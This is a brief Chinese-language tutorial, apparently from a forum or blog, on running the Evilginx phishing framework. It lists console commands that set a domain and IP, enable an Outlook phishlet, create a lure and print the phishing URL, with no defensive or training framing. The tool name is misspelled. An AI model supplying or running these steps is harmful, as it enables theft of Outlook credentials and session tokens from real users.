网上也有教程，不过是英文版的，大家可以自行谷歌，补充一下知识盲点，我在这就给大家讲解一个简单实用的操作过程

在linux上运行，需要go语言环境，自行百度go语言环境搭建

之后直接运行程序  enliginx  就ok了




直接上步骤：
config domain 77169.xyz
config ip 111.111.111.111
phishlets hostname outlook 77169.xyz
phishlets enable outlook   

这一步有可能会报错，报错的原因就是要解析他的执行的二级域名
lures create outlook
lures get-url 0



之后复制弹出来的链接  在谷歌上打开就ok了。
